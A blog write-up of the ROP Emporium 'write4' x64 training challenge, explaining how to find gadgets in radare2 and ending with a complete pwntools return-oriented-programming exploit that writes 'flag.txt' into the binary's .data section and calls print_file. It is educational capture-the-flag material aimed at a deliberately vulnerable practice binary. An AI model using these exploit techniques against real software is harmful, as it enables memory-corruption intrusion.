---
layout: post
title:  "ROP Emporium write4 Writeup (x64)"
date:   2024-06-04 13:15:45 -0400
categories: rop-emporium write4
tags: rop-emporium write4 x64 writeup buffer-overflow rop reverse-engineering 64-bit
---
## Introduction
[ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
provides a series of challenges to learn and practice
Return Oriented Programming (ROP). This is the
[fourth challenge](https://ropemporium.com/challenge/write4.html){:target="_blank"}{:rel="noopener noreferrer"}
of eight.

> This is what a hint will look like!
{: .prompt-tip }

### Goal
According to the
[challenge page](https://ropemporium.com/challenge/write4.html){:target="_blank"}{:rel="noopener noreferrer"}
our goal is to call `print_file()` with the name of the
file to read as the first argument. The string `flag.txt`
doesn't exist in the binary, so we will need to write it
there ourselves!

## Exploit Crafting
The offset for `x64` challenges will be `40 bytes`. If
you want to know how to find this value see the
[first writeup]({% post_url 2024-05-31-rop-emporium-ret2win-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}
for this series.

### Write Gadget
> Check out `usefulFunction`'s assembly
{: .prompt-tip }

Using `radare2` we can analyze a binary by
running `aaa`. We will need to write `flag.txt` to
memory so let's check the `usefulGadgets` section
in `usefulFunction`
We can view the assembly with the following commands

```
s sym.usefulFunction
V
p
```

![useful gadgets](/images/write4/x64-useful-gadgets.png)

The `mov` instruction will set the value from
`r15` (8 byte qword) into the dereferenced address 
set in `r14`. This is what we'll use to write to memory!
The gadget address is `0x00400628`

### Mov Arguments
> Find a gadget to control `r14` and `r15` along with
> a writable program segment
{: .prompt-tip }
Now we need to find a gadget which can control `r14` and
`r15` to control what to write and where to write it. We
can use the `/R` command to search for gadgets
```
/R pop r14
```

![mov args gadget](/images/write4/x64-mov-args-gadget.png)

There are a few which come up but might as well use
this one. Remember we can control where we jump so we
can skip the `pop rbp` instruction entirely! The address
we'll use to set `r14` and `r15` is `0x0x00400690`

Now that we can control where to write and what to write,
where and what should we write? We want to open `flag.txt`
so we'll set that into `r15`. But we need to find a
suitable location to write to. We can view writable
sections with the command `iS`

![writable sections](/images/write4/x64-writable-sections.png)

We need to find a section with the `w` permission and a
size of at least 8 bytes (0x08). Let's use the `.data`
section which has the address `0x00601028`

The python code to write data to an address looks
like this
```python
#!/bin/python3
from pwn import *

# useful addresses
write_gadget = 0x00400628   # mov qword [r14], r15
pop_r14_r15 = 0x00400690
data_addr = 0x00601028

# write byte string s to address addr
# return payload in bytes
def write_str(addr, s):
    payload = b''
    # write every 8 bytes of a string
    for i in range(0, len(s), 8):
        # address to write to
        r14 = p64(addr + i)

        # prevent slice out of bounds
        j = i+8
        if j >= len(s):
            j = len(s)

        # 8 bytes to write
        r15 = p64(int.from_bytes(s[i:j], 'little'))

        # set mov args
        payload += p64(pop_r14_r15)
        payload += r14
        payload += r15

        # write bytes
        payload += p64(write_gadget)
    return payload
```

### print_file()
> Find the `print_file` address and a gadget which
> sets the `rdi` register
{: .prompt-tip }

First let's find the address of `print_file()` using
the command `afl`

![print-file-addr](/images/write4/x64-print-file-addr.png)

`print_file` is part of a library so we can just use the
address of corresponding `plt` entry, `0x00400510`

Now we need to set the first argument to this function.
According to the
[x64 calling convention](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf){:target="_blank"}{:rel="noopener noreferrer"},
the first argument of a function is passed through the `rdi`
register. Let's find a gadget to control it

```
/R pop rdi
```

![rdi-addr](/images/write4/x64-rdi-addr.png)

Perfect! Our gadget address is `0x00400693`

## Exploit
We finally have everything to build the final exploit
```python
#!/bin/python3
from pwn import *

# useful addresses
write_gadget = 0x00400628   # mov qword [r14], r15
pop_r14_r15 = 0x00400690
data_addr = 0x00601028
print_file_addr = 0x00400510
pop_rdi = 0x00400693

# write byte string s to address addr
# return payload in bytes
def write_str(addr, s):
    payload = b''
    # write every 8 bytes of a string
    for i in range(0, len(s), 8):
        # address to write to
        r14 = p64(addr + i)

        # prevent slice out of bounds
        j = i+8
        if j >= len(s):
            j = len(s)

        # 8 bytes to write
        r15 = p64(int.from_bytes(s[i:j], 'little'))

        # set mov args
        payload += p64(pop_r14_r15)
        payload += r14
        payload += r15

        # write bytes
        payload += p64(write_gadget)
    return payload

# create payload
payload = b'A' * 40

# write flag.txt to data section
payload += write_str(data_addr, b'flag.txt')

# call print_file(flag_txt_addr)
payload += p64(pop_rdi)
payload += p64(data_addr)
payload += p64(print_file_addr)

# send payload + receive flag
io = process('./write4')
io.recvline()
io.send(payload)
io.recvuntil(b'Thank you!\n')
flag = io.recvline()
log.success(flag.decode('utf-8'))
```
![flag](/images/write4/x64-flag.png)

## Conclusion
In this challenge we learned how to write arbitrary
data to memory. By this point we should be relatively
comfortable finding and chaining gadgets together. Next
we'll learn how to deal with forbidden characters in
our payload.

[Previous Challenge (callme)]({% post_url 2024-06-02-rop-emporium-callme-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}

Next Challenge (badchars)

[write4 x86]({% post_url 2024-06-04-rop-emporium-write4-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}
